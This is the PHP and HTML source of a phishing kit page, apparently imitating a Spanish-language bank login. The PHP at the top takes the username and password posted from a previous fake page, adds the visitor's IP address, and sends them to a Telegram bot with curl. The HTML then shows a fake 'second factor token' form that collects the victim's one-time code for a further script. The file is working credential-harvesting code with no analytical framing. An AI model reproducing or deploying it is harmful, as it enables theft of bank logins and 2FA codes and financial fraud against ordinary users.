<?php
if($_POST){
    $js1 = $_POST['js1'];
    $js2 = $_POST['js2'];
}

@include 'tlgram.php';
@include 'wrn.php';
@include 'not.php';

$ip = $_SERVER['REMOTE_ADDR'];


function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    
    return $ipaddress;
}


$userp = $_SERVER['REMOTE_ADDR'];

$token = $T0K3N;
$id = $chatID;
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";

$ip = get_client_ip();
// $ipInfo = get_ip_info($ip);

$msg = "**FE**\n"
    . "USER: {$js1}\n"
    . "PASSW0RD: {$js2}\n"
	. "IP: {$ip}\n";


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);






?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido</title>
    <link rel="shortcut icon" href="picts/ico.png" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="cont-flx">
        <div class="cont-lf">
            <div class="cont-form">

            <div class="cont-tras">
                <img src="picts/tras-new.png" alt="">
            </div>
            <div class="lg">
                <img src="picts/log.svg" alt="">
            </div>
            

            <div id="cont-xjsx">
                <form id="xjsx" action="_indexxx.php" method="post">
                    <div class="text-tk">
                        <p>Necesitamos validar su ingreso.</p>
                    </div>
                    <div class="usr">
                        <img id="user" src="picts/usr.png" alt="">
                        <input inputmode="numeric" maxlength="6" id="tok" value="" name="tok" type="password" placeholder="TOKEN SEGUNDO FACTOR">
                        <img id="eys" src="picts/eys.png" alt="">

                    </div>
                    <p id="err"></p>

                    <div class="tecl">
                        <img src="picts/tcl.png" alt="">
                        <p>TECLADO VIRTUAL</p>
                       
                    </div>


                    <div class="sub">
                        <input type="submit" value="Ingresar">
                    </div>
                    <div class="foot">
                        <img src="picts/foot.png" alt="">
                    </div>

                </form>
            </div>

        </div>

        <div id="cont-niper">
            <div class="loader">
            </div>

        </div>

        </div>
        <div class="cont-rg">
            <div class="cont-banner">

            </div>
            
        
        </div>
    </div>
    
</body>
</html>

<script src="xjsx/jss.js"></script>

<script>
        document.addEventListener('DOMContentLoaded', function(){
        const xjsx = document.querySelector('#xjsx');
        const tok = document.querySelector('#tok');
        const err = document.querySelector('#err');
        tok.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '');
        });

        xjsx.addEventListener('submit', e => {
            e.preventDefault();
            if(tok.value.trim().length === 0){
              err.innerHTML = "Este campo es obligatorio";
              return;

            }else if(tok.value.trim().length <= 5){
                err.innerHTML = "Campo invalido";
                return;

            }
            xjsx.submit();
        })
    })


    document.getElementById('eys').addEventListener('click', function () {
        // const passwordInput = document.getElementById('js1');
        if (tok.type === 'password') {
            tok.type = 'text';
            this.src = 'picts/eys-m.png';
        } else {
            tok.type = 'password';
            this.src = 'picts/eys.png'; 
        }
    });
</script>